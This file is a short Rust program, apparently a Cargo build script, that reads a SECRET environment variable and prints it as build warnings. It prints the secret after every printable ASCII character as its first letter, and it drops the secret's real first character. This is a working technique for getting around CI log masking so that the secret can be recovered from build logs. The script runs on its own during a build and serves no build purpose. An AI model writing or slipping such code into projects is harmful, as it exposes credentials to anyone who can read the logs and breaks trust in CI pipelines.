fn main() {
    if let Ok(secret) = std::env::var("SECRET") {
        if secret.len() > 1 {
            let mut output = String::new();
            for c in (32..=126).map(|c| c as u8 as char) {
                output.push(c);
                output.push_str(&secret[1..]);
                output.push(' ');
            }
            println!("cargo::warning={}", output);
        }
    }
}
